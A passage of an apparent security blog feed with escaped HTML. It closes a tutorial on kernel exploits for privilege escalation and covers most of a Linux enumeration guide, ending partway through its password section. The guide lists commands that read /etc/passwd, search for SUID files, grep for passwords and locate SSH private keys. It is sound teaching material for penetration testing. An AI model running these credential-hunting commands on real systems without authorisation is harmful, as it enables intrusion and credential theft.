+&lt;li>&lt;strong>A Vulnerable Kernel&lt;/strong>: The target system must be running a kernel version that contains a known vulnerability.&lt;/li>
+&lt;li>&lt;strong>A Matching Exploit&lt;/strong>: There must be an existing exploit tailored for that specific vulnerability.&lt;/li>
+&lt;li>&lt;strong>Ability to Transfer the Exploit&lt;/strong>: The attacker needs the means to transfer the exploit code to the target system.&lt;/li>
+&lt;li>&lt;strong>Ability to Execute the Exploit&lt;/strong>: The attacker must have the capability to run the exploit on the target successfully.&lt;/li>
+&lt;/ol>
+&lt;h2 id="identifying-vulnerable-kernels">Identifying Vulnerable Kernels
+&lt;/h2>&lt;p>To determine if a target kernel is vulnerable, you need to conduct some enumeration. Use the following command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl"> uname -a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> uname -r
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>The &lt;code>uname -a&lt;/code> command provides complete system information, while &lt;code>uname -r&lt;/code> displays the kernel version specifically.&lt;/li>
+&lt;li>Once you have this information, check online to see if the revealed kernel version contains any known vulnerabilities that could be exploited for privilege escalation.&lt;/li>
+&lt;/ul>
+&lt;h3 id="resources-for-finding-kernel-exploits">Resources for Finding Kernel Exploits
+&lt;/h3>&lt;p>Here are some valuable resources to help you identify kernel exploits:&lt;/p>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://github.com/lucyoa/kernel-exploits" title="null"
+target="_blank" rel="noopener"
+>Kernel Exploits Repository on GitHub&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.exploit-db.com/" title="null"
+target="_blank" rel="noopener"
+>Exploit Database&lt;/a>&lt;/li>
+&lt;li>The &lt;code>searchsploit&lt;/code> tool from Kali Linux can also be incredibly useful for searching exploits.&lt;/li>
+&lt;/ul>
+&lt;h3 id="modifying-exploits">Modifying Exploits
+&lt;/h3>&lt;p>If you discover that an exploit doesn’t work despite the correct kernel version, consider either switching to a different exploit or modifying the exploit code to better suit the target environment. Exploits often require tailoring to match specific configurations or system defenses.&lt;/p>
+&lt;h2 id="practical-labs-for-learning">Practical Labs for Learning
+&lt;/h2>&lt;p>If you&amp;rsquo;re looking to practice kernel exploitation techniques, consider engaging with the following labs:&lt;/p>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://www.vulnhub.com/entry/stapler-1,150/" title="null"
+target="_blank" rel="noopener"
+>Stapler on VulnHub&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://tryhackme.com/r/room/linprivesc?utm_source=admin" title="null"
+target="_blank" rel="noopener"
+>Linux Privilege Escalation Room on TryHackMe&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;p>These platforms provide a safe and controlled environment to hone your skills in identifying and exploiting kernel vulnerabilities.&lt;/p>
+&lt;h3 id="conclusion">Conclusion
+&lt;/h3>&lt;p>Kernel exploits are powerful tools for attackers, and understanding how they function is crucial for both offensive and defensive cybersecurity practices. By familiarizing yourself with the conditions for exploitation and utilizing available resources and labs, you can enhance your knowledge and skills in this critical area of cybersecurity.&lt;/p></description></item><item><title>Linux Enumeration</title><link>https://zerodex1.github.io/p/linux-enumeration/</link><pubDate>Tue, 21 Jan 2025 14:22:34 +0000</pubDate><guid>https://zerodex1.github.io/p/linux-enumeration/</guid><description>&lt;img src="https://zerodex1.github.io/post/moon.jpg" alt="Featured image of post Linux Enumeration" />&lt;h1 id="linux-enumeration-for-privilege-esclation">linux Enumeration For Privilege esclation
+&lt;/h1>&lt;p>&lt;strong>In this article I will share with you some techniques for enumerate linux system.&lt;/strong>&lt;/p>
+&lt;p>Table of contents :&lt;/p>
+&lt;pre>&lt;code>- System and User Enumeration
+- Files Enumeration
+- Network Enumeration
+- Password Enumeration
+- Automation Tools
+&lt;/code>&lt;/pre>
+&lt;h2 id="system-and-user-enumeration">System and User Enumeration
+&lt;/h2>&lt;p>&lt;strong>System and user enumeration involves gathering information about the operating system, users, groups, and privileges to identify potential weaknesses for privilege escalation.&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>uname&lt;/code>: The &lt;code>uname&lt;/code> command, when used with the &lt;code>-a&lt;/code> option, displays detailed information about the Linux kernel:&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl"> uname -a
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>&lt;code>cat /etc/os-release&lt;/code>: This command displays information about the target system’s distribution and version:&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl"> cat /etc/os-release
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>&lt;code>cat /proc/version&lt;/code>: This command displays more detailed information about the Linux kernel, including the compiler used to build it:&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl"> cat /proc/version
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Current User and Group:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl"> whoami
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> id
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> groups
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Logged-in Users:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl"> w
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> last
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>System Users:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">cat /etc/passwd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">awk -F: &lt;span class="s1">&amp;#39;$3 &amp;lt; 1000 {print $1}&amp;#39;&lt;/span> /etc/passwd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Sudo Permissions:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo -l
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Environment Variables:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">env
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Processes Owned by Other Users:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">ps aux
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Hidden Users (Check for unusual configurations):&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">ls -la /home/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Files with SUID/SGID Bit:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">find / -perm /6000 -type f 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="files-enumeration">Files Enumeration
+&lt;/h2>&lt;p>&lt;strong>File enumeration involves searching for sensitive files, misconfigurations, or improper permissions that can be exploited to escalate privileges or gain unauthorized access.&lt;/strong>&lt;/p>
+&lt;p>Search for World-Writable Files:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">find / -type f -perm -o+w 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Search for World-Writable Directories:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">find / -type d -perm -o+w 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Search for Files Owned by Root:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">find / -uid &lt;span class="m">0&lt;/span> -type f 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Search for Files with SUID Bit:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">find / -perm /4000 -type f 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Search for Files with SGID Bit:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">find / -perm /2000 -type f 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Search for Configuration Files Containing Credentials:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">grep -Ri &lt;span class="s2">&amp;#34;password&amp;#34;&lt;/span> /etc/* 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">grep -Ri &lt;span class="s2">&amp;#34;passwd&amp;#34;&lt;/span> /home/* 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Identify Writable Files in System Directories:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">find /etc -writable 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Look for Backup Files:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">find / -name &lt;span class="s2">&amp;#34;*.bak&amp;#34;&lt;/span> -o -name &lt;span class="s2">&amp;#34;*.backup&amp;#34;&lt;/span> 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Search for SSH Keys:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">find / -name &lt;span class="s2">&amp;#34;id_rsa&amp;#34;&lt;/span> -o -name &lt;span class="s2">&amp;#34;id_dsa&amp;#34;&lt;/span> 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Search for Sensitive Application Configuration Files;&lt;/p>
+&lt;p>&lt;strong>Apache:&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">cat /etc/httpd/conf/httpd.conf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;strong>MySQL:&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">cat /etc/mysql/my.cnf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Find Recent Files Modified or Created:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">find / -type f -mtime -5 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Find Hidden Files:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">find / -name &lt;span class="s2">&amp;#34;.*&amp;#34;&lt;/span> 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Identify Files Owned by Current User:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">find / -user &lt;span class="k">$(&lt;/span>whoami&lt;span class="k">)&lt;/span> 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Check for Backup/Temp Files in Home Directories:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">ls -laR /home/ &lt;span class="p">|&lt;/span> grep &lt;span class="s2">&amp;#34;~&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="network-enumeration">Network Enumeration
+&lt;/h2>&lt;p>&lt;strong>Network enumeration involves discovering network configurations, active connections, and accessible services to identify potential attack vectors for privilege escalation or lateral movement.&lt;/strong>&lt;/p>
+&lt;p>Show Network Interfaces:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">ip a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ifconfig
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Routing Table:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">ip route
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">route -n
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>View Active Network Connections:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">netstat -tuln
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ss -tuln
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>DNS Configuration:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">cat /etc/resolv.conf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>ARP Table:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">arp -a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ip neigh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Ping to Test Connectivity:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">ping -c &lt;span class="m">4&lt;/span> &amp;lt;target-ip&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Traceroute to Map Network Path:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">traceroute &amp;lt;target-ip&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Identify Listening Ports:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">netstat -tulnp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lsof -i
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Scan Open Ports on Target:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nmap -sS -p- &amp;lt;target-ip&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="password-enumeration">Password Enumeration
+&lt;/h2>&lt;p>&lt;strong>Password hunting involves searching for stored credentials, configuration files, or weakly protected secrets that can be used to gain unauthorized access or escalate privileges.&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Some applications and services store sensitive information, including credentials, in configuration files.&lt;/li>
+&lt;/ol>
+&lt;p>Common Locations:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
